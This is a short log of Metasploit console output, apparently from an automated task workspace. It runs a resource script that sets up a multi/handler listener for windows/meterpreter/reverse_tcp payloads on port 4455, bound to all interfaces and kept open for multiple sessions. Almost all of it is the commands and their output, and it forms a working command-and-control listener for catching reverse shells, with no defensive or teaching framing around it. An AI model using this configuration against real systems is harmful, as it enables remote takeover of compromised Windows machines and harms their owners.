[0m[1m[34m[*][0m Processing /workspace/tasks/20250809/824f7d9a-listener/output/handler.rc for ERB directives.
resource (/workspace/tasks/20250809/824f7d9a-listener/output/handler.rc)> use exploit/multi/handler
[0m[1m[34m[*][0m Using configured payload generic/shell_reverse_tcp
resource (/workspace/tasks/20250809/824f7d9a-listener/output/handler.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
[0mPAYLOAD => windows/meterpreter/reverse_tcp
resource (/workspace/tasks/20250809/824f7d9a-listener/output/handler.rc)> set LHOST 0.0.0.0
[0mLHOST => 0.0.0.0
resource (/workspace/tasks/20250809/824f7d9a-listener/output/handler.rc)> set LPORT 4455
[0mLPORT => 4455
resource (/workspace/tasks/20250809/824f7d9a-listener/output/handler.rc)> set ExitOnSession false
[0mExitOnSession => false
resource (/workspace/tasks/20250809/824f7d9a-listener/output/handler.rc)> exploit -j -z
[0m[1m[34m[*][0m Exploit running as background job 0.
[1m[34m[*][0m Exploit completed, but no session was created.
[0m[1m[34m[*][0m Started reverse TCP handler on 0.0.0.0:4455 
[0m
Jobs
====

  Id  Name                    Payload                       Payload opts
  --  ----                    -------                       ------------
  0   Exploit: multi/handler  windows/meterpreter/reverse_  tcp://0.0.0.0:4455
                              tcp

[0m